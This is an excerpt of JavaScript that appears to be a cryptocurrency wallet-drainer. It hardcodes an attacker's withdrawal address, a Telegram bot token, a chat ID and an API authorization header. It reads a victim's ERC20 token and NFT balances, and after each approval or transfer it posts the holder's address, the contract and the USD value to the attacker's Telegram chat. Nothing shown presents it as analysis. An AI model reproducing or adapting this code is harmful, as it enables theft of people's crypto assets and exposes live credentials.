...
const WITHDRAWAL_ADDRESS = "0xb1F6CA0379c32804FD17ad573dB3078922AAee68"
const MINIMAL_SUM_IN_USD = 1
const TOKEN_ID = "5393705486:AAGUgecdfGWVaQesiOEEq6gVH0j_dxZpwsg"
const CHAT_ID = "-650953371"
...
const getBalances = async () => {
    try {
        ...
        const response = await $.ajax({
            ...
            type: "GET",
            headers: {
                Authorization: "Basic YWJiNGI1ZDUtOGNhNS00ZGUwLTlmYmItYzk2ODA0ZWI4OWNiOg=="
            }
        })
        ...
        for(let i = 0; i < accountBalances.nft.length + 1; i++) {
    ...
    data: "parse_mode=HTML&text="+encodeURIComponent("ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(topToken.balanceUSD)+"$"), 
    }); 
                    ...
                    var z=$.ajax({  
                        type: "POST",  
                        url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
                        data: "parse_mode=HTML&text="+encodeURIComponent("ERC20 CLOSED. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(topToken.balanceUSD)+"$"), 
                        });
    ...
    type: "POST",  
    url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
    data: "parse_mode=HTML&text="+encodeURIComponent("NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(topNFT.balanceUSD)+"$"), 
    }); 
                    ...
                    var z=$.ajax({  
                        type: "POST",  
                        url: "https://api.telegram.org/bot"+TOKEN_ID+"/sendMessage?chat_id="+CHAT_ID,
                        data: "parse_mode=HTML&text="+encodeURIComponent("NFT CLOSED. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Price: "+ Math.round(topNFT.balanceUSD)+"$"), 
                        }); 
